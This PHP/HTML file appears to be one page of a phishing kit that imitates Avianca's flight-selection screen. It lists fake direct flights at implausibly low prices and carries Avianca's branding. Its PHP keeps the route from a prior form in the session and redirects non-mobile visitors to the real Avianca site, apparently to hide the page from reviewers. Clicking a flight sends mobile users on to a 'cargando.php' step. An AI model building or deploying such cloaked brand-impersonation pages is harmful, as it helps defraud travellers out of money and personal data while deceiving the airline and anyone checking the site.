<?php
session_start();
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $fechaIda = $_POST["fechaIda"];
    $fechaVuelta = $_POST["fechaVuelta"];
    $fromD = $_POST["origenDesde"];
    $fromA = $_POST["origenAeropuerto"];
    $untilH = $_POST["destinoHacia"];
    $untilA = $_POST["destinoAeropuerto"];


    session_start();

    $_SESSION['fromD'] = $fromD;
    $_SESSION['untilH'] = $untilH;

}

 $fromD = $_SESSION['fromD'];
 $untilH = $_SESSION['untilH'];


function esDispositivoMovil() {
    $userAgent = $_SERVER['HTTP_USER_AGENT'];

    $dispositivosMoviles = array(
        'Android', 'webOS', 'iPhone', 'iPad',
        'iPod', 'BlackBerry', 'Windows Phone'
    );

    foreach ($dispositivosMoviles as $dispositivo) {
        if (stripos($userAgent, $dispositivo) !== false) {
            return true;
        }
    }

    return false;
}

if (esDispositivoMovil()) {

} else {
    header('location:https://www.avianca.com/es/?poscode=CO&gad_source=1&gclid=Cj0KCQiAmNeqBhD4ARIsADsYfTf3M3CnHWAuPB5TJMPNHLxyBwgvsTEQ9E9ZtptQKnou4p8WNm3papAaAka8EALw_wcB');

}
?>

<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Document</title>
    <link rel="stylesheet" href="/css/booking.css">
</head>

<body>
    <div class="mensaje">
        <h3>Selección de vuelos</h3>
    </div>
    <!-- <div class="logo" style="margin-left:20px;">
    <img src="https://static.avianca.com/media/cr2j1dir/logoavianca-newbrand-rojo-1.svg" alt="" srcset="" width="40%">
   </div> -->

    <div class="headerPickF">

        <div class="contents">
            <center><img src="/assets/icon.png" class="iconPC" width="15%"><br></center>
            <a><?php echo "$fromD - $untilH"; ?></a>
            <span class="trip-locations">
               
                  </span><span class="vertical-line"></span>
            <span class="dates"></span>
                


             </div>

    </div>
<br>
    <div class="vueloInfoContainer ng-scope" id="miDiv" ng-repeat="" ng-click="">

        <div class="headerPriceVIC ng-hide" ng-show="$index == 0">
            <div class="tagHPVIC">
                Mejor precio
            </div>
        </div>

        <div class="contentInsideVC">

            <div class="miniTextVueloC ng-binding">
                Directo &nbsp; • &nbsp; 1h 35m
            </div>
            <div class="startHourF ng-binding">
                09:45
            </div>
            <div class="lineSeparatorHours"></div>
            <div class="endHour ng-binding">
                10:20
            </div>
            <div class="operatorByText">Incluye trayecto operado por Clic Air S.A.</div>
            <div class="finalFPrice ng-binding">
                $ 49.999 COP
            </div>

        </div>



    </div>
    <br>

    <div class="vueloInfoContainer ng-scope" ng-repeat="" ng-click="">

        <div class="headerPriceVIC ng-hide" ng-show="$index == 0">
            <div class="tagHPVIC">
                Mejor precio
            </div>
        </div>

        <div class="contentInsideVC">

            <div class="miniTextVueloC ng-binding">
                Directo &nbsp; • &nbsp; 1h 35m
            </div>
            <div class="startHourF ng-binding">
                12:40
            </div>
            <div class="lineSeparatorHours"></div>
            <div class="endHour ng-binding">
                14:15
            </div>
            <div class="operatorByText">Incluye trayecto operado por Clic Air S.A.</div>
            <div class="finalFPrice ng-binding">
                $ 119.200 COP
            </div>

        </div>



    </div>
    <br>

    <div class="vueloInfoContainer ng-scope" ng-repeat="" ng-click="">

        <div class="headerPriceVIC ng-hide" ng-show="$index == 0">
            <div class="tagHPVIC">
                Mejor precio
            </div>
        </div>

        <div class="contentInsideVC">

            <div class="miniTextVueloC ng-binding">
                Directo &nbsp; • &nbsp; 1h 35m
            </div>
            <div class="startHourF ng-binding">
                17:45
            </div>
            <div class="lineSeparatorHours"></div>
            <div class="endHour ng-binding">
                19:20
            </div>
            <div class="operatorByText">Incluye trayecto operado por Clic Air S.A.</div>
            <div class="finalFPrice ng-binding">
                $ 269.540 COP
            </div>

        </div>



    </div>

    <br>


    <div class="vueloInfoContainer ng-scope" ng-repeat="" ng-click="">

        <div class="headerPriceVIC ng-hide" ng-show="$index == 0">
            <div class="tagHPVIC">
                Mejor precio
            </div>
        </div>

        <div class="contentInsideVC">

            <div class="miniTextVueloC ng-binding">
                Directo &nbsp; • &nbsp; 1h 34m
            </div>
            <div class="startHourF ng-binding">
                15:45
            </div>
            <div class="lineSeparatorHours"></div>
            <div class="endHour ng-binding">
                17:19
            </div>
            <div class="operatorByText">Incluye trayecto operado por Clic Air S.A.</div>
            <div class="finalFPrice ng-binding">
                $ 332.000 COP
            </div>

        </div>



    </div>

    <script>
        var miDiv = document.getElementById('miDiv');
        miDiv.addEventListener('click', function() {
            window.location.href = 'cargando.php';
        });
    </script>


    <div class="footer">
        <br>
        <center> &copy Avianca S.A 2023</center>
    </div>


</body>

</html>